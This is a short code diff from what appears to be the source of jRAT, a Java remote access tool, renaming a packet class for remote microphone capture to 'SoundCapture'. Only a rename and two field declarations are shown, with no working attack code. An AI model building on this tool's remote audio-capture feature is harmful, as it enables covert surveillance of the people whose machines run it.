@@ -13,7 +13,7 @@ import pro.jrat.ui.frames.FrameRemoteSoundCapture;
 
 
 
-public class Packet58Microphone extends AbstractIncomingPacket {
+public class Packet58SoundCapture extends AbstractIncomingPacket {
 	
 	private AudioFormat format;
 	private DataLine.Info info;
